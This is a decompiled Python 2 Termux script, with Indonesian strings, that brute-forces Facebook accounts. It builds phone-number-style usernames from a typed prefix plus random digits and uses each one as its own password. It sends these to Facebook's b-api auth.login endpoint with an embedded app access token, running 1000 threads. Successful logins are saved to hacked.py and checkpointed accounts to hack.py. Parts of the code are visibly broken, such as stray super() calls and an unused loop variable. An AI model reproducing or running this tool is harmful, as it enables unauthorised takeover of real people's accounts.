#Decompiled by MR.K7C8NG
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool
os.system('termux-wake-lock')
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91m[!] please chek your enternet'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


logo = ''

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mSedang Masuk COK \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idteman = []
idfromteman = []
idmem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
#======================================
#======================================
#=====================================
#======================================
#======================================
def pilih_super():
    peak =  '1'
    if peak == '':
        print '\x1b[1;91m[!] Jangan kosong'
        pilih_super()
    else:
        if peak == '1':
             
            
            
            code=raw_input('enter number: ')
            r = open('friends.js','r')
            z=json.load(r)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                print 42*"\033[1;96m="
            else:                    
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                    pilih_super()
    
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        
        sys.stdout.flush()
        time.sleep(0)
#======================================
#======================================
#======================================
    def main(arg):
        user = arg
        try:
            for x in range(1):
                g = random.randint(1111111,9999999)
                k = str(code) + str(g)
                p = str(g)
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+ k +'&locale=en_US&password='+ k + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] '+ k + '\r\n'
                    b = open('hacked.py','a')
                    b.write( k+ '\r\n')
                    os.system('termux-vibrate -d 100 -f')
                else:
                    if 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' +k + '\r\n'
                        h=open('hack.py','a')
                        h.write(k + '\r\n')
                    else:
                        print 'not found ' + k + '\r\n'
                    try:
                        open('login.txt','r')
                    except IOError:
                        super()
        except:
            pass

    p = ThreadPool(1000)
    p.map(main, id)
    os.system('termux-vibrate -d 1000 -f&python2 v.py')

    super()
if __name__ == '__main__':
    pilih_super()
# okay decompiling 3.pyc